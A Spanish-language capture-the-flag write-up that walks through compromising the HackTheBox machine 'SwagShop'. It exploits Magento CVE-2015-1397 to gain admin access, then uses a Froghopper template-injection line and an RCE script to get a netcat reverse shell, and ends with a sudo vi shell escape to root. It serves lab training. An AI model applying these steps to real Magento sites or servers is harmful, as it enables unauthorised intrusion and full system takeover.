---
title: HackTheBox - SwagShop
author: cotes
date: 2023-09-23 17:51:00 +0800
categories: [Writeup, HackTheBox, Easy]
tags: [Linux, 'Magento Exploitation (CVE-2015-1397)', 'Magento Froghopper (RCE)', 'Binary Abusing']
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/SwagShop/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: SwagShop Machine Logo
---

Máquina Linux de nivel **Easy** de HackTheBox.

Técnicas usadas: **Magento Exploitation (CVE-2015-1397), Magento Froghopper (RCE), Binary Abusing**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/HTB/Easy/SwagShop/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos abiertos

* **`nmap -p<Puertos> -sCV <IP> -oN versiones`**

    ![](/assets/images/HTB/Easy/SwagShop/02-versions.png)

c. La web está creada con Magento

![](/assets/images/HTB/Easy/SwagShop/03-web.png)

* Si buscamos por un exploit para Magento encontramos [CVE-2015-1397](https://www.exploit-db.com/exploits/37977). Al ejecutarlo tendremos credenciales válidas para al panel de administración.

    ```bash
    ❯ python2 magento_exploit.py
    Check http://swagshop.htb/index.php/admin with creds forme:forme
    ```

d. Una vez en el panel de administrador tendremos 2 formas de ejecutar comandos

* La primera forma es con [Magento FrogHopper](https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper)

1. Primero habilitaremos la opción 'Allow Symlinks' en `System > Configuration > Developer > Template Settings > Allow Symlinks`

2. Creamos un fichero para entablarnos una reverse shell

    ![](/assets/images/HTB/Easy/SwagShop/04-payload.png)

3. Creamos una nueva categoría en `Catalog > Manage Categories` y aquí subiremos nuestro nuestro de payload. Copiaremos el link de esta imagen

    ![](/assets/images/HTB/Easy/SwagShop/05-url.png)

4. Ahora iremos a `Newsletter > Newsletter Templates` y crearemos un template con el siguiente contenido

    ```bash
    {{block type="core/template" template="../../../../../../[Link de la Image copiado]}}
    ```

5. Por último, nos ponemos en escucha con nc y damos click en **Preview Template**

    ![](/assets/images/HTB/Easy/SwagShop/06-final.png)

* Ya obtenemos una reverse shell

    ```bash
    ❯ nc -lvnp 443
    connect to [10.10.14.18] from (UNKNOWN) [10.10.10.140] 38338
    www-data@swagshop:/var/www/html$
    ```

* La segunda forma es con el script [Magento RCE < 1.9.0.1](https://gist.github.com/Mah1ndra/b15db547dfff13696ddd4236dd238e45)

1. Para esto vamos al directorio **/app** y copiar la fecha de instalación de magento

    ![](/assets/images/HTB/Easy/SwagShop/07-date.png)

2. Modificamos el script

    ```python
    username = 'forme'                                                                                                             
    password = 'forme'                                                                     
    install_date = 'Wed, 08 May 2019 07:23:09 +0000'
    ```

3. Nos entablamos una reverse shell

    ![](/assets/images/HTB/Easy/SwagShop/08-reverse.png)

### Escalada de Privilegios 💹

a. Listamos los permisos a nivel de sudoers del usuario www-data

```bash
www-data@swagshop:/var/www/html$ sudo -l

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

* Spawneamos una consola como root

    ```bash
    www-data@swagshop:/var/www/html$ sudo /usr/bin/vi /var/www/html/index.php -c ':!/bin/sh'
    # whoami 
    root
    ```